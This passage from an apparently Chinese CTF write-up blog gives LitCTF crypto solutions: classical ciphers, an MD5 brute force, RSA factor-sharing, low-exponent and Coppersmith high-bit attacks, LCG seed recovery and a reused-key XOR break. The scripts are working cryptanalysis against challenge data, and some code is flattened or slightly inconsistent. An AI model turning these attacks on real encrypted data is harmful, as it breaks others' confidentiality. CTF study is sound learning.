base?</h1><p>SWZxWl&#x3D;F&#x3D;DQef0hlEiSUIVh9ESCcMFS9NF2NXFzM</p><p>栅栏23栏</p><p>SWZxWlFDe0liUV9ScF9FNFMzX2NSMCEhISEhfQ&#x3D;&#x3D;</p><p>base64</p><p>IfqZQC{IbQ_Rp_E4S3_cR0!!!!!}</p><p>凯撒</p><p>LitCTF{LeT_Us_H4V3_fU0!!!!!}</p><h1 id="md5的破解"><a href="#md5的破解" class="headerlink" title="md5的破解"></a>md5的破解</h1><p>直接上脚本了</p><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">import stringfrom hashlib import md5c&#x3D;string.digits+string.ascii_lowercasefor i in c:    for j in c:        for o in c:            for p in c:                flag&#x3D;&#39;LitCTF&#123;md5can&#39;+i+j+&#39;3de&#39;+o+&#39;rypt213thoughcr&#39;+p+&#39;sh&#125;&#39;                if  md5(flag.encode()).hexdigest() &#x3D;&#x3D; &#39;496603d6953a15846cd7cc476f146771&#39;:                    print(flag)                    break#LitCTF&#123;md5can123dexrypt213thoughcrpsh&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="The-same-common-divisor"><a href="#The-same-common-divisor" class="headerlink" title="The same common divisor"></a>The same common divisor</h1><p>利用公因数求p，然后RSA</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2e<span class="token operator">=</span><span class="token number">65537</span>n1<span class="token operator">=</span> <span class="token number">9852079772293301283705208653824307027320071498525390578148444258198605733768947108049676831872672654449631852459503049139275329796717506126689710613873813880735666507857022786447784753088176997374711523987152412069255685005264853118880922539048290400078105858759506186417678959028622484823376958194324034590514104266608644398160457382895380141070373685334979803658172378382884352616985632157233900719194944197689860219335238499593658894630966428723660931647038577670614850305719449893199713589368780231046895222526070730152875112477675102652862254926169713030701937231206405968412044029177246460558028793385980934233</span>n3<span class="token operator">=</span> <span class="token number">4940268030889181135441311597961813780480775970170156650560367030148383674257975796516865571557828263935532335958510269356443566533284856608454193676600884849913964971291145182724888816164723930966472329604608512023988191536173112847915884014445539739070437180314205284883149421228744714989392788108329929896637182055266508625177260492776962915873036873839946591259443753924970795669864031580632650140641456386202636466624658715315856453572441182758855085077441336516178544978457053552156714181607801760605521338788424464551796638531143900048375037218585999440622490119344971822707261432953755569507740550277088437182</span>c1<span class="token operator">=</span> <span class="token number">7066425618980522033304943700150361912772559890076173881522840300333719222157667104461410726444725540513601550570478331917063911791020088865705346188662290524599499769112250751103647749860198318955619903728724860941709527724500004142950768744200491448875522031555564384426372047270359602780292587644737898593450148108629904854675417943165292922990980758572264063039172969633878015560735737699147707712154627358077477591293746136250207139049702201052305840453700782016480965369600667516646007546442708862429431724013679189842300429421340122052682391471347471758814138218632022564279296594279507382548264409296929401260</span>c2<span class="token operator">=</span> <span class="token number">854668035897095127498890630660344701894030345838998465420605524714323454298819946231147930930739944351187708040037822108105697983018529921300277486094149269105712677374751164879455815185393395371001495146490416978221501351569800028842842393448555836910486037183218754013655794027528039329299851644787006463456162952383099752894635657833907958930587328480492546831654755627949756658554724024525108575961076341962292900510328611128404001877137799465932130220386963518903892403159969133882215092783063943679288192557384595152566356483424061922742307738886179947575613661171671781544283180451958232826666741028590085269</span>n2<span class="token operator">=</span>n3<span class="token operator">^</span>n1p<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">)</span>q1<span class="token operator">=</span>n1<span class="token operator">//</span>pphi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># LitCTF&#123;TH3_Tw0_nUmb3rs_H@v3_The_sAme_D1v1s0r!!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Where-is-P"><a href="#Where-is-P" class="headerlink" title="Where is P?"></a>Where is P?</h1><p>首先低指加密求出P</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">n<span class="token operator">=</span> <span class="token number">24479907029118467064460793139240403258697681144532146836881997837526487637306591893357774423547391867013441147680031968367449693796015901951120514250935018725570026327610524687128709707340727799633444550317834481416507364804274266363478822257132586592232042108076935945436358397787891169163821061005102693505011197453089873909085170776511350713452580692963748763166981047023704528272230392479728897831538235554137129584665886878574314566549330671483636900134584707867654841021494106881794644469229030140144595938886437242375435914268001721437309283611088568191856208951867342004280893021653793820874747638264412653721</span>a<span class="token operator">=</span> <span class="token number">22184346235325197613876257964606959796734210361241668065837491428527234174610482874427139453643569493268653377061231169173874401139203757698022691973395609028489121048788465356158531144787135876251872262389742175830840373281181905217510352227396545981674450409488394636498629147806808635157820030290630290808150235068140864601098322473572121965126109735529553247807211711005936042322910065304489093415276688746634951081501428768318098925390576594162098506572668709475140964400043947851427774550253257759990959997691631511262768785787474750441024242552456956598974533625095249106992723798354594261566983135394923063605</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token keyword">def</span> <span class="token function">de</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    k <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        mm <span class="token operator">=</span> c <span class="token operator">+</span> n<span class="token operator">*</span>k        result<span class="token punctuation">,</span> flag <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>mm<span class="token punctuation">,</span> e<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token boolean">True</span> <span class="token operator">==</span> flag<span class="token punctuation">:</span>            <span class="token keyword">return</span> result        k <span class="token operator">+=</span> <span class="token number">1</span>P<span class="token operator">=</span>de<span class="token punctuation">(</span>a<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token number">66302204855869216148926460265779698576660998574555407124043768605865908069722142097621926304390549253688814246272903647124801382742681337653915017783954290069842646020090511605930590064443141710086879668946</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就是p得高位攻击</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2n<span class="token operator">=</span><span class="token number">24479907029118467064460793139240403258697681144532146836881997837526487637306591893357774423547391867013441147680031968367449693796015901951120514250935018725570026327610524687128709707340727799633444550317834481416507364804274266363478822257132586592232042108076935945436358397787891169163821061005102693505011197453089873909085170776511350713452580692963748763166981047023704528272230392479728897831538235554137129584665886878574314566549330671483636900134584707867654841021494106881794644469229030140144595938886437242375435914268001721437309283611088568191856208951867342004280893021653793820874747638264412653721</span>p_fake<span class="token operator">=</span><span class="token number">66302204855869216148926460265779698576660998574555407124043768605865908069722142097621926304390549253688814246272903647124801382742681337653915017783954290069842646020090511605930590064443141710086879668946</span><span class="token operator">&lt;&lt;</span><span class="token number">340</span>e<span class="token operator">=</span><span class="token number">65537</span>c<span class="token operator">=</span> <span class="token number">6566517934961780069851397787369134601399136324586682773286046135297104713708615112015588908759927424841719937322574766875308296258325687730658550956691921018605724308665345526807393669538103819281108643141723589363068859617542807984954436567078438099854340705208503317269397632214274507740533638883597409138972287275965697689862321166613821995226000320597560745749780942467497435742492468670016480112957715214640939272457886646483560443432985954141177463448896521810457886108311082101521263110578485768091003174683555938678346359150123350656418123918738868598042533211541966786594006129134087145798672161268647536724</span>pbits <span class="token operator">=</span> p_fake<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>kbits <span class="token operator">=</span> <span class="token number">340</span> <span class="token comment">#p失去的低位</span>pbar <span class="token operator">=</span> p_fake <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>pbits<span class="token operator">-</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"upper %d bits (of %d bits) is given"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pbits<span class="token operator">-</span>kbits<span class="token punctuation">,</span> pbits<span class="token punctuation">)</span><span class="token punctuation">)</span> PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> x <span class="token operator">+</span> pbarx0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># find root &lt; 2^kbits with factor >= n^0.3</span>p<span class="token operator">=</span>x0 <span class="token operator">+</span> pbarq<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">//</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>phi<span class="token punctuation">)</span><span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># LitCTF&#123;Y0U_hAV3_g0T_Th3_r1ghT_AnsW3r&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="我测你vva"><a href="#我测你vva" class="headerlink" title="我测你vva"></a>我测你vva</h1><p>直接写脚本逆回去</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">cipher<span class="token operator">=</span><span class="token string">'HYEQJvPZ~X@+Bp'</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>    x<span class="token operator">=</span>cipher<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">if</span> x<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span>x<span class="token punctuation">)</span>    <span class="token keyword">elif</span> x<span class="token operator">%</span><span class="token number">2</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># HZCTF&#123;Java666&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Virginia"><a href="#Virginia" class="headerlink" title="Virginia"></a>Virginia</h1><p>维吉尼亚解码得</p><pre class="line-numbers language-none"><code class="language-none">There are moments in life when you miss someone so much that you just want to pick them from your dreams and hug them for real! Dream what you want to dream;go where you want to go;be what you want to be,because you have only one life and one chance to do all the things you want to do.May you have enough happiness to make you sweet,enough trials to make you strong,enough sorrow to keep you human,enough hope to make you happy? Always put yourself in others’shoes.If you feel that it hurts you,it probably hurts the other person, too.The happiest of people don’t necessarily have the best of everything;they just make the most of everything that comes along their way.Happiness lies for those who cry,those who hurt, those who have searched,and those who have tried,for only they can appreciate the importance of people,who have touched their lives.Love begins with a smile,grows with a kiss and ends with a tear.The brightest future will always be based on a forgotten past, you can’t go on well in lifeuntil you let go of your past failures and heartaches.When you were born,you were crying and everyone around you was smiling.Live your life so that when you die,you&#39;re the one who is smiling and everyone around you is crying.Jwybmp mfho nicd gfmduhy ei ubzmf jpiqfp qii xybh dinyebjhr np szo,ui ebpmp qii suwy eivwsye szos ftzf cy ioy huz ic uoiebfl,ei ubzmf qsi nuvy zif mncwy xbph zif lfuwfz hpye ce,np nsity ebbn xuly jiv mpy ubp vscrbuyc mjxp ig nscoad qiyy spo llf lpumfj xpqy,np nsity hbp szo xuyn ui wyu nsyn eyix nsuu szo bjalfwtuuy ebfcc zscphemscq.Uyx jz jiv xzh’u, xzh’u qzlss,yiubthh vlx xcwf iuajfh ei zif,spo hcmf uotn xctm zou iy niy zjqicnvhtnz nz vscrbuyy mpgpioy’d xbs hcub ebjm xytmlaf.Gj jbmdqplo ct hzn b lpavfll Dupmbl autmhisx,lhe nsy fhn zmur&#x3D;[86, 116, 128, 80, 98, 85, 139, 122, 134, 114, 125, 136, 117, 123, 129, 127, 128, 128, 142, 130, 140, 147, 127, 132, 131, 136, 151, 134, 152, 164] -Wbydus<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>把后半部分在维吉尼亚解一下</p><pre class="line-numbers language-none"><code class="language-none">Please send this message to those people who mean something to you,to those who have touched your life in one way or another,to those who make you smile when you really need it,to those that make you see the brighter side of things when you are really down,to those who you want to let them know that you appreciate their friendship.And if you don’t, don’t worry,nothing bad will happen to you,you will just miss out on the opportunity to brighten someone’s day with this message.My password is not a regular Caesar password,and the enc flag&#x3D;[86, 116, 128, 80, 98, 85, 139, 122, 134, 114, 125, 136, 117, 123, 129, 127, 128, 128, 142, 130, 140, 147, 127, 132, 131, 136, 151, 134, 152, 164] -Caesar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token string">''</span>m<span class="token operator">=</span><span class="token number">10</span><span class="token keyword">for</span> i <span class="token keyword">in</span> enc<span class="token punctuation">:</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">-</span>m<span class="token punctuation">)</span>    m<span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># LitCTF&#123;it_is_different_caesar&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="babyLCG"><a href="#babyLCG" class="headerlink" title="babyLCG"></a>babyLCG</h1><p>简单LCG直接套脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>b<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> a    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> gcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span>a<span class="token operator">%</span>b<span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">699175025435513913222265085178805479192132631113784770123757454808149151697608216361550466652878</span><span class="token punctuation">,</span> <span class="token number">193316257467202036043918706856603526262215679149886976392930192639917920593706895122296071643390</span><span class="token punctuation">,</span> <span class="token number">1624937780477561769577140419364339298985292198464188802403816662221142156714021229977403603922943</span><span class="token punctuation">,</span> <span class="token number">659236391930254891621938248429619132720452597526316230221895367798170380093631947248925278766506</span><span class="token punctuation">,</span> <span class="token number">111407194162820942281872438978366964960570302720229611594374532025973998885554449685055172110829</span><span class="token punctuation">,</span> <span class="token number">1415787594624585063605356859393351333923892058922987749824214311091742328340293435914830175796909</span><span class="token punctuation">,</span> <span class="token number">655057648553921580727111809001898496375489870757705297406250204329094679858718932270475755075698</span><span class="token punctuation">,</span> <span class="token number">1683427135823894785654993254138434580152093609545092045940376086714124324274044014654085676620851</span><span class="token punctuation">,</span> <span class="token number">492953986125248558013838257810313149490245209968714980288031443714890115686764222999717055064509</span><span class="token punctuation">,</span> <span class="token number">70048773361068060773257074705619791938224397526269544533030294499007242937089146507674570192265</span><span class="token punctuation">]</span>t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>s<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>all_n <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    all_n<span class="token punctuation">.</span>append<span class="token punctuation">(</span>gcd<span class="token punctuation">(</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>t<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">*</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>t<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>t<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>MMI <span class="token operator">=</span> <span class="token keyword">lambda</span> A<span class="token punctuation">,</span> n<span class="token punctuation">,</span>s<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>N<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token keyword">and</span> t<span class="token operator">%</span>N <span class="token keyword">or</span> MMI<span class="token punctuation">(</span>n<span class="token punctuation">,</span> A<span class="token operator">%</span>n<span class="token punctuation">,</span> t<span class="token punctuation">,</span> s<span class="token operator">-</span>A<span class="token operator">//</span>n<span class="token operator">*</span>t<span class="token punctuation">,</span> N <span class="token keyword">or</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span>n<span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment">#逆元计算</span><span class="token keyword">for</span> n <span class="token keyword">in</span> all_n<span class="token punctuation">:</span>    n<span class="token operator">=</span><span class="token builtin">abs</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">if</span> n<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    a<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span>MMI<span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">%</span>n    ani<span class="token operator">=</span>MMI<span class="token punctuation">(</span>a<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    b<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>a<span class="token operator">*</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>n    seed <span class="token operator">=</span> <span class="token punctuation">(</span>ani<span class="token operator">*</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>n    plaintext<span class="token operator">=</span>seed    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#LitCTF&#123;31fcd7832029a87f6c9f760fcf297b2f&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="隐晦的聊天记录"><a href="#隐晦的聊天记录" class="headerlink" title="隐晦的聊天记录"></a>隐晦的聊天记录</h1><p>首先求出密钥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">c1<span class="token operator">=</span><span class="token string">"attack at dawn"</span>c2<span class="token operator">=</span><span class="token string">'6c73d5240a948c86981bc294814d'</span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">int</span><span class="token punctuation">(</span>c2<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">[13, 7, 161, 69, 105, 255, 172, 231, 236, 59, 166, 245, 246, 35]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后求第二个明文</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">246</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">]</span>c<span class="token operator">=</span><span class="token string">'Monday or Thur'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token comment">#40 68 cf 21 8 86 8c 88 9e 1b f2 9d 83 51 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以观察到其中有一个是  8  我们补成08</p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;4068cf2108868c889e1bf29d8351&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Euler"><a href="#Euler" class="headerlink" title="Euler"></a>Euler</h1><p>欧拉定理</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnumn <span class="token operator">=</span> <span class="token number">115140122725890943990475192890188343698762004010330526468754961357872096040956340092062274481843042907652320664917728267982409212988849109825729150839069369465433531269728824368749655421846730162477193420534803525810831025762500375845466064264837531992986534097821734242082950392892529951104643690838773406549</span>c <span class="token operator">=</span> <span class="token number">406480424882876909664869928877322864482740577681292497936198951316587691545267772748204383995815523935005725558478033908575228532559165174398668885819826720515607326399097899572022020453298441</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token operator">=</span>c<span class="token operator">-</span>x<span class="token operator">^</span><span class="token number">2</span>f<span class="token operator">=</span>f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token operator">=</span>f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">400</span><span class="token punctuation">,</span>beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span><span class="token 